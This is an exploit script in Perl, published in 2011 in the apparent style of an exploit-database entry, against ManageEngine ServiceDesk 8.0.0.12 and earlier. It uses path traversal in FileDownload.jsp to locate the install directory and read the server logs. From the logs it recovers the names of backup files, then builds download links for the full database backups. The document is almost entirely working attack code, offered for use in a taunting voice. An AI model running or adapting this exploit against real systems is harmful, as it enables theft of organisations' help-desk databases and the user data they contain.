# Exploit Title: ManageEngine ServiceDesk <= 8.0.0.12 Database Disclosure
# Google Dork: none
# Date: 07.07.2011
# Author: @ygoltsev
# Software Link: http://www.manageengine.com/
# Version: <=8.0.0.12
# Tested on: Windows
# CVE : None

 

#!/usr/bin/perl
use LWP::UserAgent;
use File::stat;

$ptxt="
#################################################
# _____             _         ____          _   
#|   __|___ ___ _ _|_|___ ___|    \ ___ ___| |_ 
#|__   | -_|  _| | | |  _| -_|  |  | -_|_ -| '_|
#|_____|___|_|  \_/|_|___|___|____/|___|___|_,_|
#                                            
#################################################
 [0-day] [Database disclosure]
[desc: Exploit for ServiceDesk v *.* OS: Windows]
";

print $ptxt;

 

$ua=LWP::UserAgent->new();

 

$url="http://127.0.0.1";

$path="/workorder/FileDownload.jsp";

 

 

$installPath=&getInstallPathWin($url,$path);

 

if ($installPath ne "") {

                @backups=&getServerOutLogs($url,$path,$installPath);

} else {

                print "Install path not found :(\n";

                exit();

}

 

if (scalar(@backups)>0) {

                print "hehe.. We got paths to backup files..\n If they are
on the same drive and exists - we will own their world!!\n";

                foreach $backLine (@backups) {

                               @backInfo=split(/ --- /,$backLine);

                               #print "Trying to download $backInfo[1] from
$backInfo[0]...\n";

                               &downloadBackups($url,$path,$backLine);

                }

}

unlink("bad");

 

print "Dude, check out \'db_backups.html\'\n";

 

 

sub downloadBackups {

                my ($url,$path,$backLine) = @_;

                @backInfo=split(/ --- /,$backLine);

 
$backupUrl="${url}${path}?module=agent\&path=./\&delete=false\&FILENAME=..\\
..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\
..\\..\\..\\..\\$backInfo[0]$backInfo[1]";

                #$br=$ua->get($backupUrl);

                #if ($br->is_success) {

                #             open(A,">$backInfo[1]");

                #             print A $br->content;

                #             close(A);

                #}

                open(A,">>db_backups.html");

                print A "<a href='$backupUrl'>$backInfo[1]</a><br>\n";

                close(A);

}

 

 

 

sub getServerOutLogs {

                my ($url,$path,$installPath) = @_;

                

 
$badUrl="${url}${path}?module=agent\&path=./\&delete=false\&FILENAME=..\\..\
\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\
\..\\..\\..\\${installPath}server\\default\\log\\serverout11111111111${i}.tx
t";

                $br=$ua->get($badUrl);

                if ($br->is_success) {

                               open(A,">bad");

                               print A $br->content;

                               close(A);

                }

 

                for ($i=0;$i<=10;$i++) {

 
$logUrl="${url}${path}?module=agent\&path=./\&delete=false\&FILENAME=..\\..\
\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\
\..\\..\\..\\${installPath}server\\default\\log\\serverout${i}.txt";

                               $br=$ua->get($logUrl);

                               if ($br->is_success) {

                                               open(A,">${i}.txt");

                                               print A $br->content;

                                               close(A);

                                               if
(stat("bad")->size!=stat("${i}.txt")->size) {

                                               } else {

 
unlink("${i}.txt");

                                               }

                               }

                }

 

                for ($i=0;$i<=10;$i++) {

                               if (-e "${i}.txt") {

                                               open(A,"${i}.txt");

                                               @log=<A>;

                                               close(A);

                                               foreach $line (@log) {

                                                               if ($line=~/:
Build number(.*): ([0-9]+)\|/) {

 
$tBuild=$2;

 
if ($sdBuild eq "") {

 
$sdBuild=$tBuild;

 
}

                                                               }

                                                               if
($line=~/\[([0-9]+):([0-9]+):([0-9]+):([0-9]+)\]\|\[([0-9]+)-([0-9]+)-([0-9]
+)\]\|\[SYSOUT\](.*)BACKUPDIR=(.*), ATTACHMENT=/) {

 
push(@backups,"$9 ---
backup_servicedesk_XBUILDX_database_${5}_${6}_${7}_${1}_${2}.data");

 


                                                               }

                                               }

                                               unlink("${i}.txt");

                               }

                }

                

                if (scalar(@backups)>0) {

                               print "Man, you are realy lucky! We found
some info about ServiceDesk backups..\nBUT, I need your help now,
hehe\nLet's construct directories!\np.s. type without drive letter, like
\\backup\\\n";

                } else {

                               print "Bad luck.. Check your karma,
seriously..Where is my fucking latte!?!?\np.s. No info about backups was
found :(";

                               exit();

                }

                

                foreach $mb (@backups) {

                               $mb=~s/XBUILDX/$sdBuild/gi;

                               @dir=split(/ --- /,$mb);

                               print "Trash Dir: $dir[0]\n";

                               print "Right Dir: ";

                               chomp($rDir=<STDIN>);

                               if ($rDir ne "") {

                                               $fullDB=$dir[1];

 
$fullDB=~s/database/fullbackup/gi;

                                               push(@backupFiles,"$rDir ---
$dir[1]");

                                               push(@backupFiles,"$rDir ---
$fullDB");

                               }

                }

                return @backupFiles;

}

 

 

 

 

sub getInstallPathWin {

                my ($url,$path) = @_;

 
$url1="${url}${path}?module=agent\&path=./\&delete=false\&FILENAME=..\\..\\.
.\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.
.\\..\\..\\";

                @paths=("ServiceDesk\\","ManageEngine\\ServiceDesk\\");

 
@checkFiles=("dashgjifyq8412348fhsjfghjqw.txt","COPYRIGHT","logs\\configport
.txt","bin\\run.bat","server\\default\\log\\boot.log");

                $i=0;

                foreach $p (@paths) {

                               $k=0;

                               foreach $f (@checkFiles) {

                                               $checkUrl="${url1}${p}${f}";

                                               $br=$ua->get($checkUrl);

                                               if ($br->is_success) {

 
open(A,">${i}${k}");

                                                               print A
$br->content;

                                                               close(A);

                                               }

                                               $k++;

                               }

                               $i++;

                }

                for ($i=0;$i<scalar(@paths);$i++) {

                               $ok=0;

                               for ($k=0;$k<scalar(@checkFiles);$k++) {

                                               if (-e "${i}${k}") {

                                                               if ($k==0) {

 
$incorrectSize=stat("${i}${k}")->size;

                                                               } else {

 
if (stat("${i}${k}")->size!=$incorrectSize) {

 
$ok++;

 
}

                                                               }

                                               }

                               }

                               if ($ok>0) {

                                               if ($ok==4) {

                                                               print "You
are lucky! \nServiceDesk installed to: $paths[$i]\n";

 
$ret=$paths[$i];

                                               } elsif ($ok>2) {

                                                               print "I
think ServiceDesk installed to: $paths[$i]\n";

 
$ret=$paths[$i];

                                               } elsif ($ok>1) {

                                                               print "You
are lucky if ServiceDesk installed to: $paths[$i]\n";

 
$ret=$paths[$i];

                                               }

                               }

                }

 

 

                for ($i=0;$i<scalar(@paths);$i++) {

                               for ($k=0;$k<scalar(@checkFiles);$k++) {

                                               unlink("${i}${k}");

                               }

                }

 

                if ($ret eq "") {

                               print "Bad luck man :\/\n";         

                               $ret=0;

                }

                return $ret;

}